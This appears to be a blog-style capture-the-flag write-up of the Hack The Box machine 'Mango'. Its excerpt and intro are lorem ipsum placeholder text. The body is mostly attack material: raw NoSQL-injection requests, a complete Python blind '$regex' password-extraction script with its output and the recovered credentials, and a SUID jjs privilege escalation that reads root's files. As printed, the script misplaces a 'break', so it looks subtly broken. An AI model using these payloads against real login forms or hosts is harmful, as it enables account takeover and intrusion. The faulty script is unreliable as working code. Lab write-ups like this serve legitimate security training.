---
layout: single
title: Mango - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-11-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-mango/mango_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-mango/mango_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n mango.htb
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
    |   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
    |_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
    80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: 403 Forbidden
    443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Mango | Search Base
    | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
    | Not valid before: 2019-09-27T14:21:19
    |_Not valid after:  2020-09-26T14:21:19
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |_  http/1.1
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  nmap -Pn -sV -n -p- mango.htb
    PORT    STATE SERVICE VERSION
    22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
    443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  nmap -Pn -sV -n -sU mango.htb
    All 1000 scanned ports on mango.htb (10.10.10.162) are closed

2. Enum with dirb and nikto, loot:
    Login Page: http://staging-order.mango.htb   (also shown in nmap ssl-script)

3. Browsing https://mango.htb/analytics.php gives you a key and that it's applicable for *codepen.io, add it to host-file
    root@p3:~/Downloads# cat /etc/hosts
      10.10.10.162	mango.htb staging-order.mango.htb mango.htb.codepen.io

    Browsing the site https://mango.htb.codepen.io/analytics.php now gives us analytic data over startups in different states.

4. Connecting to Elasticsearch and using some random table gives us data from /User/iansadovy/Downloads/Entities.cvs
    POSSIBLE USERNAME: iansadovy

5. Trying NoSQL Injection (via Burp) on the login page reveals that the username is admin.
   Request with 'testuser' returns Response '200 OK', but request with user 'admin' returns '302 Found', confirming the user.
    REQUEST
      POST / HTTP/1.1
      Host: staging-order.mango.htb
      username=testuser&password[$gt]=&login=login
    RESPONSE
      HTTP/1.1 200 OK

    REQUEST
      POST / HTTP/1.1
      Host: staging-order.mango.htb
      username=admin&password[$gt]=&login=login
    RESPONSE
      HTTP/1.1 302 Found

6. In order to get the password we need a script go through every character to see if we get 302 or 200 responses.
   From the following two sites I found examples of Blind NoSQL Injection using POST.
    .. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body
    .. https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

   I used the script from 0daylabs as my base and modified it to fit my objective, complete script below.

     import requests
     import string
     import re

     pw = ""
     url = "http://staging-order.mango.htb/index.php"

     # Each time a 302 redirect is seen, we should restart the loop
     restart = True

     while restart:
         restart = False

         # Characters like *, ., &, and + has to be avoided because we use regex
         for i in string.ascii_letters + string.digits + "!#%&'(),/:;<=>@[]^_`{}~-":
             payload = pw + i
             post_data = {'username': 'admin', 'password[$regex]': "^" + re.escape(payload) + ".*", 'login': 'login'}
             #print(post_data)
             r = requests.post(url, data=post_data, allow_redirects=False)
             #print(r)

             # A correct password means we get a 302 redirect
             if r.status_code == 302:
                 print(payload)
                 restart = True
                 pw = payload

             break

    NOTE: In the end I got stuck with regex and special characters. re.escape() and "^" infront of the payload solved it.

7. Run the script to extract the password and login.
   NOTE: Creds - admin:t9KcS3>!0B#2

   root@p3:/opt/htb/machines/mango# python pwExtract.py
      t
      t9
      t9K
      t9Kc
      t9KcS
      t9KcS3
      t9KcS3>
      t9KcS3>!
      t9KcS3>!0
      t9KcS3>!0B
      t9KcS3>!0B#
      t9KcS3>!0B#2
    root@p3:/opt/htb/machines/mango#

8. Modify the script to enumerate users. We know of user admin, so using the script will stop on A. Using burp I found another
   user starting with M. Entered M as the starting letter in the script and run it:

   root@p3:/opt/htb/machines/mango# python userExtract.py
      ma
      man
      mang
      mango
   root@p3:/opt/htb/machines/mango#

   Extract the password for user Mango.
   root@p3:/opt/htb/machines/mango# python pwExtract.py
      h
      h3
      h3m
      h3mX
      h3mXK
      h3mXK8
      h3mXK8R
      h3mXK8Rh
      h3mXK8RhU
      h3mXK8RhU~
      h3mXK8RhU~f
      h3mXK8RhU~f{
      h3mXK8RhU~f{]
      h3mXK8RhU~f{]f
      h3mXK8RhU~f{]f5
      h3mXK8RhU~f{]f5H
   root@p3:/opt/htb/machines/mango#

   NOTE: Creds - mango:h3mXK8RhU~f{]f5H

9. Using SSH to login with admin-creds doesn't work, but with mango-creds it does. Looking in /home/admin we can see user.txt
   but can't read it. Change user to admin to get the flag.

    mango@mango:/home/admin$ cat user.txt
      cat: user.txt: Permission denied
    mango@mango:/home/admin$ su admin
    $ cat user.txt
      79bf****************************

ALL FOUND CREDS:
  admin:t9KcS3>!0B#2
  mango:h3mXK8RhU~f{]f5H
  iansadovy:
  MrR3boot:
  root:


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. SSH in as user mango and pivot to admin. Upgrade the shell, python isn't available so user python3 instead.
    $ python3 -c 'import pty;pty.spawn("/bin/bash")'
    admin@mango:/home/mango$

2. Running lse.sh gives ut two binaries with SUID bit set
    [!] fst020 Uncommon setuid binaries........................................ yes!
    ---
    /usr/bin/run-mailcap
    /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
    ---

3. Looking at gftobins jjs has a lot of exploits, the one that worked for me is "File Read". Trying to use "Sudo" or "Shell" made the
   shell non-interactive / stuck. Using "Reverse Shell" I wasn't able to get a callback, so I opted towards the easy "File Read".

   admin@mango:/dev/shm$ vi read.sh
   admin@mango:/dev/shm$ chmod +x read.sh
   admin@mango:/dev/shm$ ./read.sh
     Warning: The jjs tool is planned to be removed from a future JDK release
     jjs> var BufferedReader = Java.type("java.io.BufferedReader");
     jjs> var FileReader = Java.type("java.io.FileReader");
     jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
     jjs> while ((line = br.readLine()) != null) { print(line); }
     8a8e****************************

   NOTE: To get an interactive root-shell you can also use "File Write" and write your public key to /root/.ssh/authorized_keys

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


MongoDB NoSQLi:
  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#post-with-json-body
  https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

GTFOBINS:
  https://gtfobins.github.io/gtfobins/jjs/
